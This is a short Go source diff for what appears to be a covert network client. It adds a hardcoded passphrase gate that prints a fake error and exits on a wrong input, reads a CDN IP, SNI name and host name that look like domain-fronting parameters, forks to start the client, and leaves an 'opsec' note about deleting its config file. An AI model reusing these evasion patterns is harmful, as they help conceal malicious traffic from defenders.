@@ -18,17 +18,29 @@ func main() {
     scanner.Scan()
     secret := scanner.Text()
 
-    fmt.Println(secret)
+    //Use a secret to enhence opsec
+    if secret != "C{ZM2<%4H!)$kQ8cuaV?"{
+        printErr()
+        os.Exit(0)
+    }
 
+    scanner.Scan()
+    cdn_ip := scanner.Text()
 
+    scanner.Scan()
+    sni_name := scanner.Text()
 
-	printErr()
+    scanner.Scan()
+    host_name := scanner.Text()
 
-	//fork and run
+    //To do 
+    //delete the config file
+
+	//fork and run enhence opsec
 	id, _, _ := syscall.Syscall(syscall.SYS_FORK, 0, 0, 0)
 	if id == 0 {
 		//child process
-		k := h3pclient.StartClient()
+		k := h3pclient.StartClient(cdn_ip,sni_name,host_name)
 		fmt.Println(k)
 
 	} else {
